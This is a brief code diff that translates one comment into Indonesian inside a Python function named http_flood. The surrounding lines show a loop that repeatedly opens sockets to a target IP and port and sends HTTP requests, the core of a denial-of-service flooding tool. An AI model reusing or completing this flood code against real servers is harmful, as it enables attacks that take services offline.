@@ -147,7 +147,7 @@ def http_flood(ip, port, duration):
                 break
             else:
                 pass
-            # Re-create the socket for each iteration
+            # Buat ulang soket untuk setiap iterasi
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect((ip, port))
             sock.sendall(http_request)
